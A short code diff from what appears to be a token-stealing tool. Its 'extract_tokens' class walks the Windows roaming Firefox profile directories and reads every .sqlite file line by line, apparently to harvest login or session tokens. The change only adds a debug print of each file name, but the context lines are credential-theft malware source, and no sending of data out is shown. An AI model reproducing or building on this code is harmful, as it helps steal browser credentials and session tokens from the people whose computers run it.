@@ -83,6 +83,7 @@ class extract_tokens:
         if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                 for _file in files:
+                    print(_file)
                     if not _file.endswith('.sqlite'):
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
